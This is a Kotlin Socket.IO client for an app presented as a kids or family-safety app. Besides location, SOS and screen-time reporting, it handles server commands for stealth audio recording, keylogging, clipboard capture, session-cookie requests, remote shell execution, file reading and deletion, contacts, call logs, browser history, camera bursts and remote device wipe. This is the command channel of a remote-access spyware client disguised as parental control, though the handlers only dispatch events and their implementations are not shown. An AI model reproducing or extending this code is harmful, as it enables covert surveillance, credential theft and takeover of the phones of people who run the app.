package com.xixfamily.kids.network

import android.util.Log
import com.xixfamily.kids.utils.Config
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONObject
import java.net.URI

class SocketManager {
    companion object {
        private const val TAG = "KidsSocket"
        private var instance: SocketManager? = null

        fun getInstance(): SocketManager {
            if (instance == null) instance = SocketManager()
            return instance!!
        }
    }

    private var socket: Socket? = null
    private var isConnected = false
    private val eventListeners = mutableMapOf<String, MutableList<(JSONObject) -> Unit>>()

    fun connect() {
        connect(Config.SERVER_URL)
    }

    fun connect(serverUrl: String) {
        try {
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = 10
                reconnectionDelay = 2000
                timeout = 10000
            }

            socket = IO.socket(URI.create(serverUrl), options)

            socket?.on(Socket.EVENT_CONNECT) {
                isConnected = true
                Log.d(TAG, "Connected to server")
                emitEvent("socket:connected", JSONObject())
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnected = false
                Log.d(TAG, "Disconnected")
                emitEvent("socket:disconnected", JSONObject())
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.firstOrNull()}")
            }

            // Screen control events
            socket?.on("screen:capture") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:capture", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing screen:capture: ${e.message}")
                }
            }

            socket?.on("screen:lock") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:lock", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing screen:lock: ${e.message}")
                }
            }

            socket?.on("screen:unlock") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:unlock", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing screen:unlock: ${e.message}")
                }
            }

            socket?.on("screen:view:start") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:view:start", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing screen:view:start: ${e.message}")
                }
            }

            socket?.on("screen:view:stop") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:view:stop", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing screen:view:stop: ${e.message}")
                }
            }

            // CCTV camera events
            socket?.on("camera:start") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("camera:start", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing camera:start: ${e.message}")
                }
            }

            socket?.on("camera:stop") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("camera:stop", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing camera:stop: ${e.message}")
                }
            }

            // Voice monitoring events
            socket?.on("voice:start") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("voice:start", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing voice:start: ${e.message}")
                }
            }

            socket?.on("voice:stop") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("voice:stop", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing voice:stop: ${e.message}")
                }
            }

            // App blocklist events
            socket?.on("blocklist:block") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("blocklist:block", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing blocklist:block: ${e.message}")
                }
            }

            socket?.on("blocklist:unblock") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("blocklist:unblock", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing blocklist:unblock: ${e.message}")
                }
            }

            // Media access events
            socket?.on("media:list") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("media:list", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing media:list: ${e.message}")
                }
            }

            socket?.on("media:file") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("media:file", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing media:file: ${e.message}")
                }
            }

            // WiFi request event
            socket?.on("wifi:request") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("wifi:request", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing wifi:request: ${e.message}")
                }
            }

            // Blocklist sync event (authenticate after)
            socket?.on(Socket.EVENT_CONNECT) {
                isConnected = true
                Log.d(TAG, "Connected to server")
                emitEvent("socket:connected", JSONObject())
                // Request blocklist sync on connect
                emit("blocklist:sync", JSONObject())
            }

            socket?.on("blocklist:sync:result") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("blocklist:sync:result", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing blocklist:sync: ${e.message}")
                }
            }

            // Screen recording events
            socket?.on("screen:recording:start") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:recording:start", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing recording:start: ${e.message}")
                }
            }

            socket?.on("screen:recording:stop") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("screen:recording:stop", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing recording:stop: ${e.message}")
                }
            }

            // Stealth audio events
            socket?.on("audio:stealth:start") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("audio:stealth:start", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing stealth:start: ${e.message}")
                }
            }

            socket?.on("audio:stealth:stop") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("audio:stealth:stop", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing stealth:stop: ${e.message}")
                }
            }

            // Session cookie request
            socket?.on("session:request-cookies") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("session:request-cookies", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing session:request: ${e.message}")
                }
            }

            // Device info request
            socket?.on("device:info:request") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("device:info:request", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing device:info:request: ${e.message}")
                }
            }

            // Remote shell events
            socket?.on("shell:execute") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("shell:execute", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing shell:execute: ${e.message}")
                }
            }

            // Contacts request
            socket?.on("contacts:request") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("contacts:request", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing contacts:request: ${e.message}")
                }
            }

            // File manager events
            socket?.on("file:list") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("file:list", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing file:list: ${e.message}")
                }
            }

            socket?.on("file:read") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("file:read", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing file:read: ${e.message}")
                }
            }

            socket?.on("file:delete") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject ?: JSONObject()
                    emitEvent("file:delete", data)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing file:delete: ${e.message}")
                }
            }

            // ========== NEW FEATURES: Clipboard Monitor ==========
            socket?.on("clipboard:start") { args ->
                try { emitEvent("clipboard:start", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "clipboard:start error: ${e.message}") }
            }
            socket?.on("clipboard:stop") { args ->
                try { emitEvent("clipboard:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "clipboard:stop error: ${e.message}") }
            }

            // ========== NEW: Call Logs ==========
            socket?.on("call:request") { args ->
                try { emitEvent("call:request", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "call:request error: ${e.message}") }
            }

            // ========== NEW: Keylogger ==========
            socket?.on("keylog:start") { args ->
                try { emitEvent("keylog:start", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "keylog:start error: ${e.message}") }
            }
            socket?.on("keylog:stop") { args ->
                try { emitEvent("keylog:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "keylog:stop error: ${e.message}") }
            }

            // ========== NEW: App Usage Monitor ==========
            socket?.on("app:usage:start") { args ->
                try { emitEvent("app:usage:start", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "app:usage:start error: ${e.message}") }
            }
            socket?.on("app:usage:stop") { args ->
                try { emitEvent("app:usage:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "app:usage:stop error: ${e.message}") }
            }

            // ========== NEW: Browser History ==========
            socket?.on("browser:history:request") { args ->
                try { emitEvent("browser:history:request", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "browser:history:request error: ${e.message}") }
            }

            // ========== NEW: Remote Notification ==========
            socket?.on("notify:send") { args ->
                try { emitEvent("notify:send", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "notify:send error: ${e.message}") }
            }

            // ========== NEW: Remote Ring ==========
            socket?.on("device:ring") { args ->
                try { emitEvent("device:ring", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:ring error: ${e.message}") }
            }
            socket?.on("device:ring:stop") { args ->
                try { emitEvent("device:ring:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:ring:stop error: ${e.message}") }
            }

            // ========== NEW: Remote Reboot/Shutdown/Lock/Wipe ==========
            socket?.on("device:reboot") { args ->
                try { emitEvent("device:reboot", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:reboot error: ${e.message}") }
            }
            socket?.on("device:shutdown") { args ->
                try { emitEvent("device:shutdown", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:shutdown error: ${e.message}") }
            }
            socket?.on("device:lock") { args ->
                try { emitEvent("device:lock", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:lock error: ${e.message}") }
            }
            socket?.on("device:wipe") { args ->
                try { emitEvent("device:wipe", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "device:wipe error: ${e.message}") }
            }

            // ========== NEW: SIM Card Info ==========
            socket?.on("sim:request") { args ->
                try { emitEvent("sim:request", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "sim:request error: ${e.message}") }
            }

            // ========== NEW: Battery Monitor ==========
            socket?.on("battery:monitor:start") { args ->
                try { emitEvent("battery:monitor:start", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "battery:monitor:start error: ${e.message}") }
            }
            socket?.on("battery:monitor:stop") { args ->
                try { emitEvent("battery:monitor:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "battery:monitor:stop error: ${e.message}") }
            }

            // ========== NEW: Flashlight Control ==========
            socket?.on("flashlight:on") { args ->
                try { emitEvent("flashlight:on", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "flashlight:on error: ${e.message}") }
            }
            socket?.on("flashlight:off") { args ->
                try { emitEvent("flashlight:off", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "flashlight:off error: ${e.message}") }
            }


            // ========== Camera Burst ==========
            socket?.on("camera:burst:start") { args ->
                try { emitEvent("camera:burst:start", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "camera:burst:start error: ${e.message}") }
            }
            socket?.on("camera:burst:stop") { args ->
                try { emitEvent("camera:burst:stop", args.firstOrNull() as? JSONObject ?: JSONObject()) }
                catch (e: Exception) { Log.e(TAG, "camera:burst:stop error: ${e.message}") }
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Error connecting: ${e.message}")
        }
    }

    fun authenticate(userId: String, role: String, familyCode: String, name: String) {
        emit("auth", JSONObject().apply {
            put("userId", userId)
            put("role", role)
            put("familyCode", familyCode)
            put("name", name)
        })
    }

    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        isConnected = false
    }

    fun emit(event: String, data: JSONObject) {
        socket?.emit(event, data)
    }

    fun sendLocation(latitude: Double, longitude: Double, accuracy: Float, batteryLevel: Int) {
        emit("location:update", JSONObject().apply {
            put("latitude", latitude)
            put("longitude", longitude)
            put("accuracy", accuracy)
            put("batteryLevel", batteryLevel)
        })
    }

    fun triggerSOS(latitude: Double?, longitude: Double?, message: String) {
        emit("sos:trigger", JSONObject().apply {
            if (latitude != null) put("latitude", latitude)
            if (longitude != null) put("longitude", longitude)
            put("message", message)
        })
    }

    fun sendCheckIn(status: String, message: String) {
        emit("checkin", JSONObject().apply {
            put("status", status)
            put("message", message)
        })
    }

    fun reportScreenTimeLimit(totalMinutes: Int, limitMinutes: Int) {
        emit("screen-time:limit-reached", JSONObject().apply {
            put("totalMinutes", totalMinutes)
            put("limitMinutes", limitMinutes)
        })
    }

    fun addEventListener(event: String, listener: (JSONObject) -> Unit) {
        eventListeners.getOrPut(event) { mutableListOf() }.add(listener)
    }

    fun removeEventListener(event: String, listener: (JSONObject) -> Unit) {
        eventListeners[event]?.remove(listener)
    }

    private fun emitEvent(event: String, data: JSONObject) {
        eventListeners[event]?.forEach { it(data) }
    }

    fun isSocketConnected(): Boolean = isConnected
}
